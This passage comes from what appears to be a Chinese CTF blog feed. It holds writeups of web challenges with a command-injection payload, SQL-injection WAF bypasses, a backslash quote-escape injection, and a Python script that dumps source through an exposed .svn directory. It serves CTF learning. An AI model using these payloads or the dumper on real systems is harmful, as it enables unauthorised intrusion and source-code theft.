（好吧，服了，一直拿sql在注，返回速度还特别慢），用burp加载top 10 password（原来还有这种东西），爆破登录界面得到flag。</p><h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><p>秒做的题目, payload <code>127.0.0.1;cat flag</code> 命令执行绕过有很多姿势，但遗憾的是这边没有过滤。 </p><h3 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h3><p>waf这题题目其实一开始也不会的，也是通过提示来过的，黑盒测试发现waf拦截许多东西，最为关键的就是 union select，所以想办法绕过，经过N次测试，发现<code>/*!50000select*/</code> 不会被waf拦截，于是构造<code>%27/*!50000union*/%0a/*!50000select*/%0aflag%0a/*!50000from*/flag%23</code> 得到flag</p><h3 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h3><p>好像是叫这个名字？忘了，赛后听说是admin，密码是123456，然后进去一系列骚操作获取flag，又是考弱口令啊啊啊啊啊啊</p><h3 id="markdown"><a href="#markdown" class="headerlink" title="markdown"></a>markdown</h3><p>也是赛后得知的，考察通过markdown的ssrf来获取信息，语法是<code>![](flag.php)</code>，flag的文件名需要通过robots.txt文件来获取，构造即可从源码中获得到flag信息。</p><h3 id="box"><a href="#box" class="headerlink" title="box"></a>box</h3><p>也是赛后得知的，听说是全国大学生信安赛的<code>wanna to see your hat</code> ,（蜜汁微笑，技术支持真懒）。不过作为biner，当时比赛的时候，没去碰这题题目，没做出来，认了。。。。赛后复现如下。</p><p>拿weakfilescan扫描以下敏感文件，发现存在svn泄漏。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">--------------------------------------------------</div><div class="line">* scan http://123.59.52.228:1515 start</div><div class="line">--------------------------------------------------</div><div class="line">[200] http://123.59.52.228:1515 =&gt; http://123.59.52.228:1515/route.php?act=index</div><div class="line">[200] http://123.59.52.228:1515/.svn/entries =&gt; http://123.59.52.228:1515/.svn/entries</div><div class="line">--------------------------------------------------</div><div class="line">* scan complete...</div><div class="line">--------------------------------------------------</div><div class="line">&#123;</div><div class="line">  &quot;dirs&quot;: &#123;</div><div class="line">    &quot;http://123.59.52.228:1515&quot;: [</div><div class="line">      &quot;http://123.59.52.228:1515/&quot;</div><div class="line">    ]</div><div class="line">  &#125;, </div><div class="line">  &quot;files&quot;: &#123;</div><div class="line">    &quot;http://123.59.52.228:1515&quot;: &#123;</div><div class="line">      &quot;/.svn/&quot;: [</div><div class="line">        &quot;http://123.59.52.228:1515/.svn/entries&quot;</div><div class="line">      ]</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>使用svn.py将源码dump下来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python      </span></div><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line">__author__ = <span class="string">'Rivir'</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"> </div><div class="line"><span class="keyword">print</span> <span class="string">'''</span></div><div class="line"> ----</div><div class="line">    _____               ______            __    </div><div class="line">  / ___/   ______     /_  __/___  ____  / /____</div><div class="line">  \__ \ | / / __ \     / / / __ \/ __ \/ / ___/</div><div class="line"> ___/ / |/ / / / /    / / / /_/ / /_/ / (__  ) </div><div class="line">/____/|___/_/ /_/    /_/  \____/\____/_/____/  </div><div class="line">                author: Rivir</div><div class="line"> ----</div><div class="line">\                             .       .</div><div class="line"> \                           / `.   .' " </div><div class="line">  \                  .---.  &lt;    &gt; &lt;    &gt;  .---.</div><div class="line">   \                 |    \  \ - ~ ~ - /  /    |</div><div class="line">         _____          ..-~             ~-..-~</div><div class="line">        |     |   \~~~\.'                    `./~~~/</div><div class="line">       ---------   \__/                        \__/</div><div class="line">      .'  O    \     /               /       \  " </div><div class="line">     (_____,    `._.'               |         &#125;  \/~~~/</div><div class="line">      `----.          /       &#125;     |        /    \__/</div><div class="line">            `-.      |       /      |       /      `. ,~~|</div><div class="line">                ~-.__|      /_ - ~ ^|      /- _      `..-'   </div><div class="line">                     |     /        |     /     ~-.     `-. _  _  _</div><div class="line">                     |_____|        |_____|         ~ - . _ _ _ _ _&gt;</div><div class="line"> </div><div class="line">'''</div><div class="line"> </div><div class="line">headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'</span>&#125;</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilename</span><span class="params">(url)</span>:</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'wc.db'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">        content = requests.get(url=url+<span class="string">'/.svn/wc.db'</span>,headers=headers).content</div><div class="line">        f.write(content)</div><div class="line"> </div><div class="line">    <span class="keyword">with</span> open(<span class="string">'svn.txt'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> file:</div><div class="line">        info = os.popen(<span class="string">"""sqlite3 wc.db 'select local_relpath, ".svn/pristine/" || substr(checksum,7,2) || "/" || substr(checksum,7) || ".svn-base" as alpha from NODES;'"""</span>).read()</div><div class="line">        <span class="comment">#print info</span></div><div class="line">        file.write(info)</div><div class="line"> </div><div class="line">    os.remove(<span class="string">'wc.db'</span>)</div><div class="line"> </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">restore_svn</span><span class="params">(url)</span>:</span></div><div class="line">    getfilename(url)</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'./svn'</span>):</div><div class="line">        os.mkdir(<span class="string">'svn'</span>)</div><div class="line">    <span class="keyword">with</span> open(<span class="string">'svn.txt'</span>) <span class="keyword">as</span> f:</div><div class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> f:</div><div class="line">            tmp = file.strip().split(<span class="string">'|'</span>)</div><div class="line">            <span class="comment">#print tmp</span></div><div class="line">            <span class="keyword">if</span> len(tmp) == <span class="number">1</span>:</div><div class="line">                <span class="keyword">continue</span></div><div class="line">            name = tmp[<span class="number">0</span>]</div><div class="line">            path = tmp[<span class="number">1</span>]</div><div class="line">            <span class="keyword">if</span> <span class="string">'/'</span> <span class="keyword">in</span> name:</div><div class="line">                book = os.path.dirname(name)</div><div class="line">                <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'./svn/'</span>+book):</div><div class="line">                    os.makedirs(<span class="string">'./svn/'</span>+book)</div><div class="line"> </div><div class="line"> </div><div class="line">            <span class="keyword">print</span> <span class="string">'download:'</span>,<span class="string">'./svn/'</span>+name</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                <span class="keyword">with</span> open(<span class="string">'./svn/'</span>+name,<span class="string">'w'</span>) <span class="keyword">as</span> f:</div><div class="line">                    req = requests.get(url+path,headers=headers)</div><div class="line">                    f.write(req.content)</div><div class="line">            <span class="keyword">except</span> Exception,e:</div><div class="line">                <span class="comment">#print e </span></div><div class="line">                <span class="keyword">pass</span></div><div class="line"> </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    restore_svn(sys.argv[<span class="number">-1</span>])</div></pre></td></tr></table></figure><p>发现flag.php文件，然而并没有什么软用。发现<code>index.php</code>中，如果<code>$_SESSION[&quot;hat&quot;]</code> == <code>&quot;black&quot;</code> 会输出flag，所以我们希望找到一个地方，这个地方是给<code>$_SESSION[&quot;hat&quot;]</code>赋予<code>&quot;black&quot;</code>字符串的，我们在login.php中找到了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">   $sql = <span class="string">"select count(*) from t_info where username = '$name' or nickname = '$name'"</span>;</div><div class="line">   <span class="keyword">echo</span> $sql;</div><div class="line">   $result = mysql_query($sql);</div><div class="line">   $row = mysql_fetch_array($result);</div><div class="line">   <span class="keyword">if</span> ($row[<span class="number">0</span>])&#123;</div><div class="line">     $_SESSION[<span class="string">'hat'</span>] = <span class="string">'black'</span>;</div><div class="line">     <span class="keyword">echo</span> <span class="string">'good job'</span>;</div><div class="line">   &#125;<span class="keyword">else</span>&#123;</div><div class="line">$_SESSION[<span class="string">'hat'</span>] = <span class="string">'green'</span>;</div><div class="line">   &#125;</div></pre></td></tr></table></figure><p>这边有个坑，reg那个页面中所用的表和login页面中登录的表不一样。。所以无论怎么注册都没用，需要选手绕过waf来注入。。。</p><p>waf规则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$name = str_replace(<span class="string">"'"</span>, <span class="string">""</span>, trim(waf($_POST[<span class="string">"name"</span>])));</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($value)</span></span>&#123;</div><div class="line">    $Filt = <span class="string">"\bUNION.+SELECT\b|SELECT.+?FROM"</span>;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$Filt.<span class="string">"/is"</span>,$value)==<span class="number">1</span>)&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"found a hacker"</span>);</div><div class="line">    &#125;</div><div class="line">    $value = str_replace(<span class="string">" "</span>,<span class="string">""</span>,$value);  </div><div class="line">    <span class="keyword">return</span> $value;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>$_POST首先会被全局转义，故而会多出个反斜杠，这边waf替换掉了单引号，但是没有替换掉反斜杠，导致反斜杠的特殊利用。</p><p><code>select count(*) from t_info where username = &#39;||1#\&#39; or nickname = &#39;||1#\&#39;</code></p><p>转到index页面获取flag</p><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>???这waf太强啦，真不会啊~</p><p>跪求大佬的wp</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>此次比赛网络环境确实不是很好，所以对于做离线题目的选手要有利的多，离线的环境。做web题的时候，用weakfilescan来发现敏感文件，发现这玩意不支持302，真坑啊。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;还好这次比赛网络环境比较差，主办方被迫放了许多离线题，让我这只bin dog有机可乘（手动滑稽），但这次比赛也确实发现自身的web能力有限，对于一些简单的web题竟然出现无从下手的情况。。也借这次比赛总结下离线环境下一些特殊操作吧。&lt;/p&gt;
&lt;h3 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h3&gt;&lt;p&gt;对于一些密码类的题目，手头有合适的工具最好了，但很多情况下，工具并不适用，比如这次比赛中，出现的aes解密，不清楚加密模式，需要输入iv和key，而手头的工具只可以输入key，且加密模式确定，没办法，只能去找库，不过比较幸运的是，之前安装过一个crypt的python库，看里面的源码，竟然有aes加密的说明，简单的倒推一下就能够推出解密脚本。&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; Crypto.Cipher &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; AES&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;key = &lt;span class=&quot;string&quot;&gt;b&#39;EaRncVfLgIPMaygA&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iv = &lt;span class=&quot;string&quot;&gt;b&#39;HDkMsMEzkkzyQLTH&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cipher = AES.new(key, AES.MODE_CBC, iv)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;msg = iv + base64.b64decode(&lt;span class=&quot;string&quot;&gt;&quot;kWZnRZMZv9JJLcD4v6o19iFKHOhc/S1Dv5y3r2YxhnRuWE8w/ji0jr0VFAGDbfzyQLcONBtB6pjetkHggUPv/rUmXoSfTnnWJ/cfv9deT56KoxwtXMGO4LJyXakTPE2tMcu0UexsnlhfhlqUE2vGnNnNUm996thkRlp3v36OfwgVGfT22UVjv+lpk0lKXgT2liQm/eBRilEaPw4o6P29YV7zN3AqI2y5Sa+I13o53cwO9JNOCXC28wuYSBrbOauu61VGj9MroQ3Si5swvx4p8vzyZZd5SkjIJ69AFi6pGPxnptofigIS5NRvVYLady+n0IWDj32whAPinOHcB8t3qJH1YtwNf9ly7gFQUgqCEXXDuRTcercMxe72siNNtg1LZTVQJLViD4G1ROdrh9Lic2BTe/9mAt/mKeRIaXJDHrTTu/d6xao4P995xjhSAhkD+cgbuOCgwhkpVH6cyRR+aFKFBv6UVZzob4s7ul9Xjzc9ETBaoE8CoAXLSZ5zEGs0jEbL0Hf5SdenlISyny97BFnqiGXRQCwBIacq+ytw/VK6DC2ddHAOndZ5K/zmnE0WuccCDTQ8gskaswFpbSG4q47HaN8t/VNug4NfZSGE/kbf+rW7QGlwMF66ksxhpthlkXJkICbpgnHNwsAjZnDhN1t9SDms4EIbozHaopiH79gy+h3N8lk/85OJfM0rac5CGcFlO9Tgf0ov6cGe8ABTIw1tFKZIcXWqETIbl60WCgBxmJFsBbl0ikDDyTsxSn8cNK8bVymqmL5TuTM2clBhd/rV44nA5vCGAnEKzfEHoV3YFc4gik8/nUutDmxJdjeqrd7M0Lm0QKpVPl8ATA5Tf2PKTJ9CaxIiLyazY74D2egqYZzddjq4aXXNPWgwYk5OKAZz+avRMJWu+ACx0wlih0ScOor4PMbpRqSc8oEjmeg=&quot;&lt;/span&gt;)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cipher.decrypt(msg)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;对于zip压缩包，还是archpr好用。。&lt;/p&gt;
&lt;p&gt;对于web弱口令还需要准备一本字典，其实早就应该准备了，包括一些bypass waf的字典，网站扫描的字典，经过这次比赛，发现对于web题而言，字典是多么重要。&lt;/p&gt;
&lt;p&gt;对于线下赛，webshellkill是一款好工具，可以直接利用其来找容易发现的一句话后门。（不过自己也需要写一个利用命令执行自动种马的脚本）&lt;/p&gt;
&lt;p&gt;rasctftools没有共模攻击的利用方式（这次比赛吃亏了！应该还有它没有的其他攻击方式）&lt;/p&gt;
&lt;p&gt;线下赛的web waf需要完善。&lt;/p&gt;
&lt;p&gt;新的pyc加密方式  &lt;code&gt;stegosaurus&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;writeup 如下&lt;br&gt;
    
    </summary>
    
    
      <category term="writeup" scheme="https://winter3un.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>【web】jarvis oj 刷题</title>
    <link href="https://winter3un.github.io/2017/06/17/jarvisoj-web/"/>
    <id>https://winter3un.github.io/2017/06/17/jarvisoj-web/</id>
    <published>2017-06-17T14:13:07.000Z</published>
    <updated>2017-07-08T15:30:58.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="web？"><a href="#web？" class="headerlink" title="web？"></a>web？</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> np</div><div class="line">o = [[<span class="number">11</span>, <span class="number">13</span>, <span class="number">32</span>, <span class="number">234</span>, <span class="number">236</span>, <span class="number">3</span>, <span class="number">72</span>, <span class="number">237</span>, <span class="number">122</span>, <span class="number">230</span>, <span class="number">157</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">225</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">142</span>, <span class="number">166</span>, <span class="number">11</span>, <span class="number">196</span>, <span class="number">194</span>, <span class="number">187</span>, <span class="number">152</span>, <span class="number">132</span>, <span class="number">135</span>], [<span class="number">76</span>, <span class="number">55</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">98</span>, <span class="number">244</span>, <span class="number">201</span>, <span class="number">125</span>, <span class="number">182</span>, <span class="number">123</span>, <span class="number">47</span>, <span class="number">86</span>, <span class="number">67</span>, <span class="number">19</span>, <span class="number">145</span>, <span class="number">12</span>, <span class="number">138</span>, <span class="number">149</span>, <span class="number">83</span>, <span class="number">178</span>, <span class="number">255</span>, <span class="number">122</span>, <span class="number">238</span>, <span class="number">187</span>, <span class="number">221</span>], [<span class="number">218</span>, <span class="number">233</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">151</span>, <span class="number">28</span>, <span class="number">150</span>, <span class="number">196</span>, <span class="number">79</span>, <span class="number">11</span>, <span class="number">150</span>, <span class="number">128</span>, <span class="number">52</span>, <span class="number">228</span>, <span class="number">189</span>, <span class="number">107</span>, <span class="number">219</span>, <span class="number">87</span>, <span class="number">90</span>, <span class="number">221</span>, <span class="number">45</span>, <span class="number">201</span>, <span class="number">14</span>, <span class="number">106</span>, <span class="number">230</span>], [<span class="number">30</span>, <span class="number">50</span>, <span class="number">76</span>, <span class="number">94</span>, <span class="number">172</span>, <span class="number">61</span>, <span class="number">229</span>, <span class="number">109</span>, <span class="number">216</span>, <span class="number">12</span>, <span class="number">181</span>, <span class="number">231</span>, <span class="number">174</span>, <span class="number">236</span>, <span class="number">159</span>, <span class="number">128</span>, <span class="number">245</span>, <span class="number">52</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">207</span>, <span class="number">145</span>, <span class="number">241</span>, <span class="number">196</span>, <span class="number">80</span>], [<span class="number">134</span>, <span class="number">145</span>, <span class="number">36</span>, <span class="number">255</span>, <span class="number">13</span>, <span class="number">239</span>, <span class="number">212</span>, <span class="number">135</span>, <span class="number">85</span>, <span class="number">194</span>, <span class="number">200</span>, <span class="number">50</span>, <span class="number">170</span>, <span class="number">78</span>, <span class="number">51</span>, <span class="number">10</span>, <span class="number">232</span>, <span class="number">132</span>, <span class="number">60</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">74</span>, <span class="number">117</span>, <span class="number">250</span>, <span class="number">45</span>], [<span class="number">142</span>, <span class="number">221</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">56</span>, <span class="number">120</span>, <span class="number">113</span>, <span class="number">143</span>, <span class="number">77</span>, <span class="number">190</span>, <span class="number">195</span>, <span class="number">133</span>, <span class="number">236</span>, <span class="number">111</span>, <span class="number">144</span>, <span class="number">65</span>, <span class="number">172</span>, <span class="number">74</span>, <span class="number">160</span>, <span class="number">1</span>, <span class="number">143</span>, <span class="number">242</span>, <span class="number">96</span>, <span class="number">70</span>, <span class="number">107</span>], [<span class="number">229</span>, <span class="number">79</span>, <span class="number">167</span>, <span class="number">88</span>, <span class="number">165</span>, <span class="number">38</span>, <span class="number">108</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">240</span>, <span class="number">116</span>, <span class="number">178</span>, <span class="number">165</span>, <span class="number">206</span>, <span class="number">156</span>, <span class="number">193</span>, <span class="number">86</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">187</span>, <span class="number">161</span>, <span class="number">55</span>, <span class="number">134</span>, <span class="number">24</span>, <span class="number">249</span>], [<span class="number">235</span>, <span class="number">175</span>, <span class="number">235</span>, <span class="number">169</span>, <span class="number">73</span>, <span class="number">125</span>, <span class="number">114</span>, <span class="number">6</span>, <span class="number">142</span>, <span class="number">162</span>, <span class="number">228</span>, <span class="number">157</span>, <span class="number">160</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">167</span>, <span class="number">63</span>, <span class="number">41</span>, <span class="number">182</span>, <span class="number">55</span>, <span class="number">189</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">31</span>, <span class="number">158</span>], [<span class="number">37</span>, <span class="number">190</span>, <span class="number">169</span>, <span class="number">116</span>, <span class="number">172</span>, <span class="number">66</span>, <span class="number">9</span>, <span class="number">229</span>, <span class="number">188</span>, <span class="number">63</span>, <span class="number">138</span>, <span class="number">111</span>, <span class="number">245</span>, <span class="number">133</span>, <span class="number">22</span>, <span class="number">87</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">106</span>, <span class="number">82</span>, <span class="number">211</span>, <span class="number">252</span>, <span class="number">57</span>, <span class="number">66</span>, <span class="number">98</span>], [<span class="number">199</span>, <span class="number">48</span>, <span class="number">58</span>, <span class="number">221</span>, <span class="number">162</span>, <span class="number">57</span>, <span class="number">111</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">126</span>, <span class="number">43</span>, <span class="number">143</span>, <span class="number">225</span>, <span class="number">85</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">232</span>, <span class="number">141</span>, <span class="number">5</span>, <span class="number">233</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">204</span>, <span class="number">155</span>, <span class="number">141</span>], [<span class="number">212</span>, <span class="number">83</span>, <span class="number">219</span>, <span class="number">55</span>, <span class="number">132</span>, <span class="number">5</span>, <span class="number">153</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">134</span>, <span class="number">201</span>, <span class="number">255</span>, <span class="number">101</span>, <span class="number">22</span>, <span class="number">98</span>, <span class="number">215</span>, <span class="number">139</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">165</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">48</span>, <span class="number">119</span>], [<span class="number">194</span>, <span class="number">156</span>, <span class="number">10</span>, <span class="number">212</span>, <span class="number">237</span>, <span class="number">112</span>, <span class="number">17</span>, <span class="number">158</span>, <span class="number">225</span>, <span class="number">227</span>, <span class="number">152</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">10</span>, <span class="number">238</span>, <span class="number">74</span>, <span class="number">76</span>, <span class="number">66</span>, <span class="number">80</span>, <span class="number">31</span>, <span class="number">73</span>, <span class="number">10</span>, <span class="number">180</span>, <span class="number">45</span>, <span class="number">94</span>], [<span class="number">110</span>, <span class="number">231</span>, <span class="number">82</span>, <span class="number">180</span>, <span class="number">109</span>, <span class="number">209</span>, <span class="number">239</span>, <span class="number">163</span>, <span class="number">30</span>, <span class="number">160</span>, <span class="number">60</span>, <span class="number">190</span>, <span class="number">97</span>, <span class="number">256</span>, <span class="number">141</span>, <span class="number">199</span>, <span class="number">3</span>, <span class="number">30</span>, <span class="number">235</span>, <span class="number">73</span>, <span class="number">225</span>, <span class="number">244</span>, <span class="number">141</span>, <span class="number">123</span>, <span class="number">208</span>], [<span class="number">220</span>, <span class="number">248</span>, <span class="number">136</span>, <span class="number">245</span>, <span class="number">123</span>, <span class="number">82</span>, <span class="number">120</span>, <span class="number">65</span>, <span class="number">68</span>, <span class="number">136</span>, <span class="number">151</span>, <span class="number">173</span>, <span class="number">104</span>, <span class="number">107</span>, <span class="number">172</span>, <span class="number">148</span>, <span class="number">54</span>, <span class="number">218</span>, <span class="number">42</span>, <span class="number">233</span>, <span class="number">57</span>, <span class="number">115</span>, <span class="number">5</span>, <span class="number">50</span>, <span class="number">196</span>], [<span class="number">190</span>, <span class="number">34</span>, <span class="number">140</span>, <span class="number">52</span>, <span class="number">160</span>, <span class="number">34</span>, <span class="number">201</span>, <span class="number">48</span>, <span class="number">214</span>, <span class="number">33</span>, <span class="number">219</span>, <span class="number">183</span>, <span class="number">224</span>, <span class="number">237</span>, <span class="number">157</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">134</span>, <span class="number">13</span>, <span class="number">99</span>, <span class="number">212</span>, <span class="number">230</span>, <span class="number">243</span>, <span class="number">236</span>, <span class="number">40</span>], [<span class="number">144</span>, <span class="number">246</span>, <span class="number">73</span>, <span class="number">161</span>, <span class="number">134</span>, <span class="number">112</span>, <span class="number">146</span>, <span class="number">212</span>, <span class="number">121</span>, <span class="number">43</span>, <span class="number">41</span>, <span class="number">174</span>, <span class="number">146</span>, <span class="number">78</span>, <span class="number">235</span>, <span class="number">202</span>, <span class="number">200</span>, <span class="number">90</span>, <span class="number">254</span>, <span class="number">216</span>, <span class="number">113</span>, <span class="number">25</span>, <span class="number">114</span>, <span class="number">232</span>, <span class="number">123</span>], [<span class="number">158</span>, <span class="number">85</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">145</span>, <span class="number">21</span>, <span class="number">105</span>, <span class="number">2</span>, <span class="number">256</span>, <span class="number">69</span>, <span class="number">21</span>, <span class="number">152</span>, <span class="number">155</span>, <span class="number">88</span>, <span class="number">11</span>, <span class="number">232</span>, <span class="number">146</span>, <span class="number">238</span>, <span class="number">170</span>, <span class="number">123</span>, <span class="number">135</span>, <span class="number">150</span>, <span class="number">161</span>, <span class="number">249</span>, <span class="number">236</span>], [<span class="number">251</span>, <span class="number">96</span>, <span class="number">103</span>, <span class="number">188</span>, <span class="number">188</span>, <span class="number">8</span>, <span class="number">33</span>, <span class="number">39</span>, <span class="number">237</span>, <span class="number">63</span>, <span class="number">230</span>, <span class="number">128</span>, <span class="number">166</span>, <span class="number">130</span>, <span class="number">141</span>, <span class="number">112</span>, <span class="number">254</span>, <span class="number">234</span>, <span class="number">113</span>, <span class="number">250</span>, <span class="number">1</span>, <span class="number">89</span>, <span class="number">0</span>, <span class="number">135</span>, <span class="number">119</span>], [<span class="number">192</span>, <span class="number">206</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">174</span>, <span class="number">130</span>, <span class="number">164</span>, <span class="number">95</span>, <span class="number">21</span>, <span class="number">153</span>, <span class="number">82</span>, <span class="number">254</span>, <span class="number">20</span>, <span class="number">133</span>, <span class="number">56</span>, <span class="number">7</span>, <span class="number">163</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">206</span>, <span class="number">51</span>, <span class="number">204</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">196</span>], [<span class="number">106</span>, <span class="number">63</span>, <span class="number">252</span>, <span class="number">202</span>, <span class="number">153</span>, <span class="number">6</span>, <span class="number">193</span>, <span class="number">146</span>, <span class="number">88</span>, <span class="number">118</span>, <span class="number">78</span>, <span class="number">58</span>, <span class="number">214</span>, <span class="number">168</span>, <span class="number">68</span>, <span class="number">128</span>, <span class="number">68</span>, <span class="number">35</span>, <span class="number">245</span>, <span class="number">144</span>, <span class="number">102</span>, <span class="number">20</span>, <span class="number">194</span>, <span class="number">207</span>, <span class="number">66</span>], [<span class="number">154</span>, <span class="number">98</span>, <span class="number">219</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">131</span>, <span class="number">185</span>, <span class="number">27</span>, <span class="number">162</span>, <span class="number">214</span>, <span class="number">63</span>, <span class="number">238</span>, <span class="number">248</span>, <span class="number">38</span>, <span class="number">129</span>, <span class="number">170</span>, <span class="number">180</span>, <span class="number">181</span>, <span class="number">96</span>, <span class="number">165</span>, <span class="number">78</span>, <span class="number">121</span>, <span class="number">55</span>, <span class="number">214</span>], [<span class="number">193</span>, <span class="number">94</span>, <span class="number">107</span>, 